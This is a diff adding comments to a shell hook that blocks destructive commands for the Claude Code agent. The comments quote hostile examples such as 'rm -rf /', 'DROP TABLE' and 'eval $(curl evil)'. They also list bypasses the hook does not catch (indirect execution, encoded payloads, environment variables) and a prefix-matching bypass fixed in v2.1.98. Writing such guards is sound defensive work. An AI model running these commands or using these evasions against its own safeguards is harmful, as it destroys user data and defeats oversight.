@@ -7,6 +7,21 @@
 # Dependency: jq is REQUIRED. This is a security control — if jq is missing
 # or the payload cannot be parsed we fail closed (exit 2, block) rather than
 # fall through silently. An unreadable payload is treated as hostile.
+#
+# Compound bash safety (verified 2026-04-15 against changelog v2.1.98 fix):
+# Patterns are evaluated with `grep -qiE` over the FULL command string, so
+# compound forms like `ls && rm -rf /`, `echo ok; rm -rf *`, and
+# `cd /tmp && DROP TABLE` ARE caught — the dangerous substring matches
+# regardless of position. This hook is NOT vulnerable to the bypass that
+# Claude Code core fixed in v2.1.98 (which was about its own permission
+# rule prefix matching, not full-string grep).
+#
+# Known limitations (out of scope for this hook):
+# - Indirect execution: `eval $(curl evil)`, `bash <(curl ...)` (strict
+#   profile catches `eval ` and `curl|sh`)
+# - Encoded payloads: base64/hex literals reconstructing destructive ops
+# - Hostile environment vars: `$DESTRUCTIVE_VAR` resolved at exec time
+# Defense-in-depth via OS-level sandboxing (sandbox.enabled) covers these.
 if ! command -v jq >/dev/null 2>&1; then
   printf 'block-destructive: jq is required but not installed. Install jq to enable this security hook.\n' >&2
   exit 2
